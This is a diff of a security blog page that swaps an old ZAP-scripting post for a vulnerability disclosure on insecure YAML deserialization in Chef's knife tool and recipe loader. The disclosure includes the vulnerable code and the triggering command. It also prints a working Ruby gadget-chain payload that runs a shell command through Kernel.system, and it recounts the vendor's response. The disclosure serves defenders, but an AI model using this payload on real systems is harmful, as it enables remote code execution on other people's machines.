@@ -38,27 +38,27 @@
   
     <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.2" />
-<meta property="og:title" content="ZAP Scripting" />
+<meta property="og:title" content="Chef Yaml Deserialization" />
 <meta name="author" content="snoopysecurity" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="Zed Attack Proxy (ZAP) is an open-source web application security scanner/proxy that can be used to find vulnerabilities. This blog post is about Zed Attack Proxy’s Scripting capabilities and how it can be very useful." />
-<meta property="og:description" content="Zed Attack Proxy (ZAP) is an open-source web application security scanner/proxy that can be used to find vulnerabilities. This blog post is about Zed Attack Proxy’s Scripting capabilities and how it can be very useful." />
-<link rel="canonical" href="http://localhost:4000/posts/ZAP-Scripting/" />
-<meta property="og:url" content="http://localhost:4000/posts/ZAP-Scripting/" />
+<meta name="description" content="YAML (YAML Ain’t Markup Language) is a popular data serialization format used in many programming languages, including Ruby. Insecure deserialization is a security vulnerability that occurs when an application deserializes data from an untrusted source and allows an attacker to execute arbitrary code or perform unauthorized actions." />
+<meta property="og:description" content="YAML (YAML Ain’t Markup Language) is a popular data serialization format used in many programming languages, including Ruby. Insecure deserialization is a security vulnerability that occurs when an application deserializes data from an untrusted source and allows an attacker to execute arbitrary code or perform unauthorized actions." />
+<link rel="canonical" href="http://localhost:4000/posts/chef-unsafe-deserialization/" />
+<meta property="og:url" content="http://localhost:4000/posts/chef-unsafe-deserialization/" />
 <meta property="og:site_name" content="💻 Blog" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2015-08-25T17:25:52+08:00" />
+<meta property="article:published_time" content="2024-08-30T03:25:52+08:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="ZAP Scripting" />
+<meta property="twitter:title" content="Chef Yaml Deserialization" />
 <meta name="twitter:site" content="@snoopysecurity" />
 <meta name="twitter:creator" content="@snoopysecurity" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"snoopysecurity"},"dateModified":"2015-08-25T17:25:52+08:00","datePublished":"2015-08-25T17:25:52+08:00","description":"Zed Attack Proxy (ZAP) is an open-source web application security scanner/proxy that can be used to find vulnerabilities. This blog post is about Zed Attack Proxy’s Scripting capabilities and how it can be very useful.","headline":"ZAP Scripting","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/ZAP-Scripting/"},"url":"http://localhost:4000/posts/ZAP-Scripting/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"snoopysecurity"},"dateModified":"2024-08-30T03:25:52+08:00","datePublished":"2024-08-30T03:25:52+08:00","description":"YAML (YAML Ain’t Markup Language) is a popular data serialization format used in many programming languages, including Ruby. Insecure deserialization is a security vulnerability that occurs when an application deserializes data from an untrusted source and allows an attacker to execute arbitrary code or perform unauthorized actions.","headline":"Chef Yaml Deserialization","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/chef-unsafe-deserialization/"},"url":"http://localhost:4000/posts/chef-unsafe-deserialization/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
 
-  <title>ZAP Scripting | 💻 | Blog
+  <title>Chef Yaml Deserialization | 💻 | Blog
   </title>
 
   <!--
@@ -312,7 +312,7 @@
         
 
           
-            <span>ZAP Scripting</span>
+            <span>Chef Yaml Deserialization</span>
           
 
         
@@ -510,7 +510,7 @@
 
 <!-- return -->
 
-<h1 data-toc-skip>ZAP Scripting</h1>
+<h1 data-toc-skip>Chef Yaml Deserialization</h1>
 
 <div class="post-meta text-muted">
     <!-- published date -->
@@ -526,10 +526,10 @@
 
 
 <em class=""
-    data-ts="1440494752"
+    data-ts="1724959552"
     data-df="ll"
     data-toggle="tooltip" data-placement="bottom">
-  Aug 25, 2015
+  Aug 30, 2024
 </em>
 
     </span>
@@ -580,8 +580,8 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="275 words">
-  <em>1 min</em> read</span>
+  title="555 words">
+  <em>3 min</em> read</span>
 
     </div>
 
@@ -590,30 +590,98 @@
 </div> <!-- .post-meta -->
 
 <div class="post-content">
-  <p>Zed Attack Proxy (ZAP) is an open-source web application security scanner/proxy that can be used to find vulnerabilities. This blog post is about Zed Attack Proxy’s Scripting capabilities and how it can be very useful.</p>
+  <p>YAML (YAML Ain’t Markup Language) is a popular data serialization format used in many programming languages, including Ruby. Insecure deserialization is a security vulnerability that occurs when an application deserializes data from an untrusted source and allows an attacker to execute arbitrary code or perform unauthorized actions.</p>
 
-<p>ZAP’s scripting feature allows a user to create a script in JavaScript or Zest to further improve ZAP Scanner capabilities. A user can write numerous scripts to work with ZAP’s active scanning, passive scanning, proxy and more. ZAP supports JavaScript and Zest scripts, but it also supports Jython and JRuby via the ZAP Marketplace.</p>
+<p>In Ruby, YAML deserialization can be exploited if the application blindly loads and processes YAML data without proper validation and sanitization. This can lead to various security risks, including remote code execution (RCE), denial of service (DoS), or data manipulation.</p>
 
-<p><a href="/assets/img/blog/zap1.png" class="popup img-link "><img data-src="/assets/img/blog/zap1.png" alt="zap1" class="lazyload" data-proofer-ignore></a></p>
+<p>I found that the Knife package and Chef package both have APIs that allows Insecure Deserialization.</p>
 
-<p>I don’t use ZAP a lot but I like the scripting feature due to how quick and easy it is. This can be useful if a user runs into a specific problem during a web application test and needs a quick fix through scripting. E.g. If a user wants the ZAP passive scanner to analyze and report all Base64 encoded data. This can be done by writing a ZAP script and enabling it on the script console.</p>
+<p>nife - Within the knife package (https://github.com/chef/chef/blob/v17.10.0/knife/lib/chef/knife/yaml_convert.rb#L54), even though you are using yaml.safe_load, on line 54, you are using yaml.load_stream to check the contents of a yaml file, this is vulnerable to insecure deserialisation.</p>
 
-<p>The script console tab itself can be used to write scripts which can be run within ZAP and also has a debug area which also displays error messages. It also provides a basic autocomplete feature which assists with the methods available associated to an object.</p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>   # YAML can contain multiple documents (--- is the separator), let's not support that.
+    if ::YAML.load_stream(yaml_contents).length &gt; 1
+      ui.fatal!("YAML recipe '#{yaml_file}' contains multiple documents, only one is supported")
+    end
+</pre></td></tr></tbody></table></code></div></div>
 
-<p>Lastly, here is a repo of ZAP Scripts written by the community. I’ve written a couple as part of the ZAP Community Scripts Competition. The competition results can be seen here:</p>
+<p>So one can provide the command knife yaml convert data.yml results.rb with the data.yml being the below dangerous code (deserialization gadget for ruby 2.x, tested on knife 17.10.0</p>
 
-<p><a href="https://wiki.owasp.org/index.php/2015-08-ZAP-ScriptingCompetition">ZAP Scripting Competition</a></p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="rouge-code"><pre>- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &amp;1 !ruby/object:Net::BufferedIO
+      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &amp;1 !ruby/object:Net::WriteAdapter
+         socket: &amp;1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: id
+         method_id: :resolve
+</pre></td></tr></tbody></table></code></div></div>
 
-<p>Two of the scripts I wrote can be seen here:</p>
+<p>This will execute the id command successfully.</p>
+
+<p><a href="/assets/img/blog/chef_knife.png" class="popup img-link "><img data-src="/assets/img/blog/chef_knife.png" alt="" class="lazyload" data-proofer-ignore></a></p>
+
+<p>Chef -  same issue also exist in chef (https://github.com/chef/chef/blob/main/lib/chef/recipe.rb#L89) where you are using yaml.load_stream to check the contents of a yaml file. But i noticed this API is used less so it might be less of a risk. With ruby yaml itself, YAML.load, YAML.load_documents, YAML.load_file and YAML.load_stream all do insecure deserialisation and the safe APIs dont.</p>
+
+<p>Impact
+The vulnerability allows code execution. an attacker may craft a malicious YAML payload that includes Ruby objects with specially crafted properties or malicious code embedded within them. When the vulnerable application deserializes this payload using the YAML parser, it may execute the attacker’s code or trigger unintended behaviors.
+payloads</p>
 
 <ul>
-  <li><a href="https://github.com/zaproxy/community-scripts/blob/master/targeted/search%20cvedetails%20using%20target%20server%20header.js">search cvedetails using target server header.js</a></li>
-  <li><a href="https://github.com/zaproxy/community-scripts/blob/master/passive/find%20base64%20strings.js">find base64 strings.js</a></li>
+  <li>https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/</li>
+  <li>https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/</li>
 </ul>
 
-<p>ZAP Community Scripts Repo: <a href="https://github.com/zaproxy/community-scripts">Community Scripts</a></p>
+<p><strong>Disclosure:</strong></p>
 
-<p>ZAP Development Wiki: <a href="https://github.com/zaproxy/zaproxy/wiki/Development">ZAP Development</a></p>
+<p>A hackerone report was submitted to Chef on June 21, 2023, after back and forth, their response on March 25, 2024, 7:14pm UTC was</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>We have marked this low because the exploit goes against best practices given to customer (that unverified content is run in DevOps operations), we will likely resolve this through tech debt upgrade. Thank you again for reporting it.
+If you have additional information to support a change of impact, or have a proof of concept (even if theoretical), please let us know. The next update will be when the fix is planned in a future release for both Chef Workstation and Chef Infra Server.
+As a note, we are moving to BugCrowd as of the end of the month and you will need to register there to continue getting status and/or file new reports.
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>After that, they removed their bugbounty program from HackeOne and I recieved no further response regarding the fix, or how to follow up with Chef and recieved no invite to their bugcrowd VDP. Following up this report seemed like a waste of time.</p>
 
 </div>
 
@@ -624,7 +692,7 @@
   <div class="post-meta mb-3">
     <i class="far fa-folder-open fa-fw mr-1"></i>
     
-      <a href='/categories/web-application-security/'>web application security</a>
+      <a href='/categories/software-security/'>software security</a>
   </div>
   
 
@@ -633,8 +701,8 @@
   <div class="post-tags">
     <i class="fa fa-tags fa-fw mr-1"></i>
       
-      <a href="/tags/zap/"
-          class="post-tag no-text-decoration" >zap</a>
+      <a href="/tags/yaml/"
+          class="post-tag no-text-decoration" >yaml</a>
       
   </div>
   
@@ -669,19 +737,19 @@
 
     
       
-        <a href="https://twitter.com/intent/tweet?text=ZAP%20Scripting%20-%20%F0%9F%92%BB%20%7C%20Blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FZAP-Scripting%2F" data-toggle="tooltip" data-placement="top"
+        <a href="https://twitter.com/intent/tweet?text=Chef%20Yaml%20Deserialization%20-%20%F0%9F%92%BB%20%7C%20Blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fchef-unsafe-deserialization%2F" data-toggle="tooltip" data-placement="top"
           title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
           <i class="fa-fw fab fa-twitter"></i>
         </a>
     
       
-        <a href="https://www.facebook.com/sharer/sharer.php?title=ZAP%20Scripting%20-%20%F0%9F%92%BB%20%7C%20Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FZAP-Scripting%2F" data-toggle="tooltip" data-placement="top"
+        <a href="https://www.facebook.com/sharer/sharer.php?title=Chef%20Yaml%20Deserialization%20-%20%F0%9F%92%BB%20%7C%20Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fchef-unsafe-deserialization%2F" data-toggle="tooltip" data-placement="top"
           title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
           <i class="fa-fw fab fa-facebook-square"></i>
         </a>
     
       
-        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FZAP-Scripting%2F&text=ZAP%20Scripting%20-%20%F0%9F%92%BB%20%7C%20Blog" data-toggle="tooltip" data-placement="top"
+        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fchef-unsafe-deserialization%2F&text=Chef%20Yaml%20Deserialization%20-%20%F0%9F%92%BB%20%7C%20Blog" data-toggle="tooltip" data-placement="top"
           title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
           <i class="fa-fw fab fa-telegram"></i>
         </a>
@@ -1301,410 +1369,410 @@
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
 
 
 
@@ -1725,7 +1793,7 @@
       
       
       <div class="card">
-        <a href="/posts/suitecrm-phar-deserialization/">
+        <a href="/posts/joern-cheat-sheet/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -1737,13 +1805,13 @@
 
 
 <em class="small"
-    data-ts="1620588352"
+    data-ts="1638991552"
     data-df="ll"
     >
-  May 10, 2021
+  Dec  9, 2021
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>SuiteCRM - Phar Deserialization to Code Execution</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Joern Cheat Sheet</h3>
             <div class="text-muted small">
               <p>
                 
@@ -1752,11 +1820,9 @@
 
 
 
-                This is a copy of a blog which i recently published on Snyk: https://snyk.io/blog/suitecrm-phar-deserialization-vulnerability-to-code-execution/
+                Joern Notes
 
-Introduction
-
-uiteCRM is a free and open source Cus...
+Joern is a static analyzer that can be used to create code property graphs and query them fairly easy. This is good alternative to CodeQL since analyzing with Joern doesn’t require you...
               </p>
             </div>
           </div>
@@ -1766,7 +1832,7 @@ uiteCRM is a free and open source Cus...
       
       
       <div class="card">
-        <a href="/posts/target_blank_vulnerability/">
+        <a href="/posts/rs-async-zipslip/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -1778,13 +1844,13 @@ uiteCRM is a free and open source Cus...
 
 
 <em class="small"
-    data-ts="1524770752"
+    data-ts="1646767552"
     data-df="ll"
     >
-  Apr 27, 2018
+  Mar  9, 2022
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>The target="_blank" Vulnerability</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>rs-async-zip Zip Path Traversal (Zip Slip)</h3>
             <div class="text-muted small">
               <p>
                 
@@ -1793,7 +1859,11 @@ uiteCRM is a free and open source Cus...
 
 
 
-                The HTML &amp;lt;a&amp;gt; element, also known as anchor element is used within webpages to create an hyperlink to another resource. The anchor tag can also be specified with several attributes, one of the...
+                Introduction
+
+rs-async-zip is a asynchronous ZIP archive reading/writing crate with a heavy focus on streaming support. This package is vulnerable to Zip Traversal (Zip Slip).
+
+Note: This issue was...
               </p>
             </div>
           </div>
@@ -1803,7 +1873,7 @@ uiteCRM is a free and open source Cus...
       
       
       <div class="card">
-        <a href="/posts/28_phppgadmin_csrf_to_code-execution/">
+        <a href="/posts/improving-graphql-security-with-static-analysis/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -1815,13 +1885,13 @@ uiteCRM is a free and open source Cus...
 
 
 <em class="small"
-    data-ts="1532805952"
+    data-ts="1649791552"
     data-df="ll"
     >
-  Jul 29, 2018
+  Apr 13, 2022
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>phppgadmin CSRF to Code Execution</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Improving GraphQL security with static analysis</h3>
             <div class="text-muted small">
               <p>
                 
@@ -1830,9 +1900,7 @@ uiteCRM is a free and open source Cus...
 
 
 
-                This advisory discloses a CSRF vulnerability that exists in phppgadmin/phppgadmin. The details that was sent to the maintainer can be seen here: phppgadmin%20CSRF%20Vulnerability.pdf
-
-CSRF Introduc...
+                GraphQL frameworks can often be interesting to code review, and often most static analysis tools don’t support them. Some work I did regarding this can be found here: https://snyk.io/blog/graphql-s...
               </p>
             </div>
           </div>
@@ -1851,17 +1919,17 @@ CSRF Introduc...
 
 <div class="post-navigation d-flex justify-content-between">
   
-  <div class="btn btn-outline-primary disabled"
+  <a href="/posts/saml-security/" class="btn btn-outline-primary"
     prompt="Older">
-    <p>-</p>
-  </div>
+    <p>Common SAML vulnerabilities and how to remediate them</p>
+  </a>
   
 
   
-  <a href="/posts/six-things-you-didnt-know-Drozer-could-do/" class="btn btn-outline-primary"
+  <div class="btn btn-outline-primary disabled"
     prompt="Newer">
-    <p>6 things I didn't know Drozer could do</p>
-  </a>
+    <p>-</p>
+  </div>
   
 
 </div>
